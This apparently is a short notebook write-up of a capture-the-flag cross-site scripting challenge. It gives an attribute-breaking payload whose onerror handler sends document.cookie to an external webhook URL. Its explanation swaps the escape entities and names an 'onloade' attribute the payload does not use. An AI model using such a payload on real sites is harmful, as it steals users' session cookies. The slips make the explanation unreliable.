{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "in this example '<' and '>' are replaced with &gt; and &lt; respectively. \n",
    "\n",
    "to solve this problem we can use the onloade attribute of the img tag to call a function that will send the flag to our webhook\n",
    "\n",
    "```html\n",
    "\" onerror=\"fetch('https://webhook.site/0cc67171-c7dc-4706-93df-d653427f627a?flag='+document.cookie)\n",
    "```\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
